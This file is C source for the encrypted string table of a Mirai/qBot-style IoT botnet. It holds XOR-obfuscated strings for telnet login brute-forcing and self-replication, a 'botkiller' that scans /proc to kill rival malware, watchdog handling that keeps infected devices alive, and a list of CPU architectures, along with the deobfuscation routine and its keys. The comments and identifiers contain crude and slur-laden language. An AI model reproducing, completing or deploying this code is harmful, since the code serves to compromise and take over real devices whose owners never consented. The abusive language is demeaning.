#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "h/x.h"
#include "h/u.h"

uint32_t table_key = 0xa43dba1f;
uint32_t table_key1 = 0xc3af750a;
struct table_value table[MAX_XOR_KEYS];

void table_init(void)
{
	//Scanner Connection Port
    a_e(X_S_PORT, "\x50\x4F", 2); // 17244

    // Encrypted qBot Strings
    a_e(XOR_NULL, "\x07\x41\x5A\x43\x43\x06\x2F", 7); // (null)

    //Keep Alive
    a_e(XOR_IOCTL_WATCH1, "\x00\x4B\x4A\x59\x00\x58\x4E\x5B\x4C\x47\x4B\x40\x48\x2F", 14); // /dev/watchdog
    a_e(XOR_IOCTL_WATCH2, "\x00\x4B\x4A\x59\x00\x42\x46\x5C\x4C\x00\x58\x4E\x5B\x4C\x47\x4B\x40\x48\x2F", 19); // /dev/misc/watchdog

    // Selfrep
    a_e(X_S_SHELL, "\x5C\x47\x4A\x43\x43\x2F", 6); // shell
    a_e(X_S_ENABLE, "\x4A\x41\x4E\x4D\x43\x4A\x2F", 7); // enable
    a_e(X_S_SYSTEM, "\x5C\x56\x5C\x5B\x4A\x42\x2F", 7); // system
    a_e(X_S_LINUXSHELL, "\x43\x46\x41\x5A\x57\x5C\x47\x4A\x43\x43\x2F", 11); // linuxshell
    a_e(X_S_SH, "\x5C\x47\x2F", 3); // sh
    
    //Checks Login
    a_e(X_S_NCORRECT, "\x41\x4C\x40\x5D\x5D\x4A\x4C\x5B\x2F", 9); // ncorrect
    a_e(X_S_OGIN, "\x40\x48\x46\x41\x2F", 5); // ogin
    a_e(X_S_ENTER, "\x4A\x41\x5B\x4A\x5D\x2F", 6); // enter
    a_e(X_S_ASSWORD, "\x4E\x5C\x5C\x58\x40\x5D\x4B\x2F", 8); // assword

    //Checks To See If Its Logged In
    a_e(X_S_QUERY, "\x00\x4D\x46\x41\x00\x4D\x5A\x5C\x56\x4D\x40\x57\x0F\x6A\x77\x66\x7B\x66\x7A\x62\x2F", 21); // /bin/busybox EXITIUM
    a_e(X_S_RESP, "\x6A\x77\x66\x7B\x66\x7A\x62\x15\x0F\x4E\x5F\x5F\x43\x4A\x5B\x0F\x41\x40\x5B\x0F\x49\x40\x5A\x41\x4B\x2F", 26); // EXITIUM: applet not found

    //For The Botkiller
    a_e(RAPE_K_PROC, "\x00\x5F\x5D\x40\x4C\x00\x2F", 7); // /proc/
    a_e(RAPE_K_EXE, "\x00\x4A\x57\x4A\x2F", 5); // /exe
    a_e(RAPE_K_FD, "\x00\x49\x4B\x2F", 4); // /fd
    a_e(RAPE_K_MAPS, "\x00\x42\x4E\x5F\x5C\x2F", 6); // /maps
    a_e(RAPE_K_TCP, "\x00\x5F\x5D\x40\x4C\x00\x41\x4A\x5B\x00\x5B\x4C\x5F\x2F", 14); // /proc/net/tcp
    a_e(RAPE_K_STATUS, "\x00\x5C\x5B\x4E\x5B\x5A\x5C\x2F", 8); // /status
    a_e(RAPE_K_ANIME, "\x01\x4E\x41\x46\x42\x4A\x2F", 7); // .anime
    // fucking skids wont know whats will come to them becuase there all fucking retarded
    a_e(RAPE_K_CMDLINE, "\x00\x4C\x42\x4B\x43\x46\x41\x4A\x2F", 9); //    /cmdline

    a_e(T_K_TMP, "\x5B\x42\x5F\x00\x2F", 5); // tmp/
    a_e(T_K_DATALOCAL, "\x4B\x4E\x5B\x4E\x00\x43\x40\x4C\x4E\x43\x2F", 11); // data/local
    a_e(T_K_QTX, "\x5E\x5B\x57\x4D\x40\x5B\x2F", 7); // qtxbot
    a_e(T_K_DOT, "\x01\x2F", 2); // .
    a_e(T_K_SDA, "\x5C\x4B\x4E\x2F", 4); // sda
    a_e(T_K_MTD, "\x42\x5B\x4B\x2F", 4); // mtd
    a_e(T_K_QTX2, "\x4D\x40\x5B\x0D\x72\x2F", 6); // bot"]
    // killer data

     a_e(T_K_mips, "\x42\x46\x5F\x5C\x2F", 5); // mips
     a_e(T_K_mpsl, "\x42\x5F\x5C\x43\x2F", 5); // mpsl
     a_e(T_K_sh4, "\x5C\x47\x1B\x2F", 4); // sh4
     a_e(T_K_x86, "\x57\x17\x19\x2F", 4); // x86
     a_e(T_K_arm6, "\x4E\x5D\x42\x19\x2F", 5); // arm6
     a_e(T_K_i686, "\x46\x19\x17\x19\x2F", 5); // i686
     a_e(T_K_ppc, "\x5F\x5F\x4C\x2F", 4); // ppc
     a_e(T_K_i586, "\x46\x1A\x17\x19\x2F", 5); // i586
     a_e(T_K_m68k, "\x42\x19\x17\x44\x2F", 5); // m68k
     a_e(T_K_spc, "\x5C\x5F\x4C\x2F", 4); // spc
     a_e(T_K_arm, "\x4E\x5D\x42\x2F", 4); // arm
     a_e(T_K_arm5, "\x4E\x5D\x42\x1A\x2F", 5); // arm5
     a_e(T_K_ppc440, "\x5F\x5F\x4C\x1B\x1B\x1F\x2F", 7); // ppc440
     a_e(T_K_arm7, "\x4E\x5D\x42\x18\x2F", 5); // arm7
     a_e(T_K_arc, "\x4E\x5D\x4C\x2F", 4); // arc
     a_e(T_K_mips64, "\x42\x46\x5F\x5C\x19\x1B\x2F", 7); // mips64
     a_e(T_K_arm4, "\x4E\x5D\x42\x1B\x2F", 5); // arm4
     a_e(T_K_arm3, "\x4E\x5D\x42\x1C\x2F", 5); // arm3
     a_e(T_K_x86_32, "\x57\x17\x19\x70\x1C\x1D\x2F", 7); // x86_32

    

    //Strings to Kill
    a_e(X_M_ASSWORD, "\x4E\x5C\x5C\x58\x40\x5D\x4B\x2F", 8); // assword
    a_e(X_M_NETSLINK, "\x00\x4B\x4A\x59\x00\x41\x4A\x5B\x5C\x43\x46\x41\x44\x00\x2F", 15); // /dev/netslink/
    a_e(X_M_QBOT, "\x7C\x7B\x6B\x2F", 4); // STD
    a_e(X_M_MODZ, "\x00\x4A\x5B\x4C\x00\x5D\x4C\x01\x4C\x40\x41\x49\x2F", 13); // /etc/rc.conf
    a_e(X_M_DEMON, "\x00\x5A\x5C\x5D\x00\x4D\x46\x41\x00\x5F\x56\x5B\x47\x40\x41\x2F", 16); // /usr/bin/python
    a_e(X_M_SELF_EXE, "\x00\x5F\x5D\x40\x4C\x00\x5C\x4A\x43\x49\x00\x4A\x57\x4A\x2F", 15); // /proc/self/exe
    a_e(X_M_UPX, "\x7A\x7F\x77\x0E\x2F", 5); // UPX!
    a_e(X_M_ROUTE, "\x00\x5F\x5D\x40\x4C\x00\x41\x4A\x5B\x00\x5D\x40\x5A\x5B\x4A\x2F", 16); // /proc/net/route
    a_e(X_M_RC, "\x00\x4A\x5B\x4C\x00\x5D\x4C\x01\x4B\x00\x5D\x4C\x01\x43\x40\x4C\x4E\x43\x2F", 19); // /etc/rc.d/rc.local
    a_e(X_M_BINSH, "\x00\x4D\x46\x41\x00\x5C\x47\x2F", 8); // /bin/sh

    //Misc 
    a_e(XOR_EXEC_SUCCESS, "\x58\x4A\x43\x43\x0F\x63\x46\x40\x41\x4A\x5C\x5C\x0F\x58\x4E\x5C\x0F\x47\x4A\x5D\x4A\x0F\x4E\x41\x4B\x0F\x4E\x5B\x4A\x0F\x56\x40\x5A\x5D\x0F\x42\x4A\x42\x40\x5D\x56\x0F\x4E\x41\x4B\x0F\x58\x46\x43\x43\x0F\x4D\x4A\x0F\x58\x46\x5B\x47\x0F\x5A\x0F\x5B\x46\x43\x43\x0F\x5B\x47\x4A\x0F\x4B\x4E\x5D\x44\x0F\x4A\x41\x4B\x2F", 79); // 
    a_e(XOR_RANDOM, "\x1D\x4D\x43\x1B\x62\x5E\x78\x4B\x69\x46\x4A\x4E\x42\x44\x49\x1A\x19\x7D\x66\x5D\x7A\x6A\x40\x6E\x64\x79\x63\x75\x60\x7C\x7E\x67\x7B\x77\x1E\x5B\x5F\x76\x65\x6B\x5A\x45\x17\x4C\x41\x18\x6C\x48\x5C\x58\x6D\x59\x61\x7F\x47\x1F\x68\x1C\x2F", 59); // 2bl4MqWdFieamkf56RIrUEoAKVLZOSQHTX1tpYJDuj8cn7CgswBvNPh0G3 
    //add_entry(TABLE_MISC_RANDSTRING, "\x24\x23\x2F\x36\x21\x2E\x23\x29\x77\x21\x2B\x32\x24\x2B\x21\x45", 16);
    }

void t_u_v(uint8_t id)
{
    struct table_value *val = &table[id];
    toggle_obf(id);
}

void t_l_v(uint8_t id)
{
    struct table_value *val = &table[id];
    toggle_obf(id);
}

char *t_r_v(int id, int *len)
{
    struct table_value *val = &table[id];
    if(len != NULL)
        *len = (int)val->val_len;

    return val->val;
}

static void a_e(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);
    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
}

static void toggle_obf(uint8_t id)
{
    int i = 0;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff,
            k5 = table_key1 & 0xff,
            k6 = (table_key1 >> 8) & 0xff,
            k7 = (table_key1 >> 16) & 0xff,
            k8 = (table_key1 >> 24) & 0xff;

    for(i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
        val->val[i] ^= k5;
        val->val[i] ^= k6;
        val->val[i] ^= k7;
        val->val[i] ^= k8;
    }
}
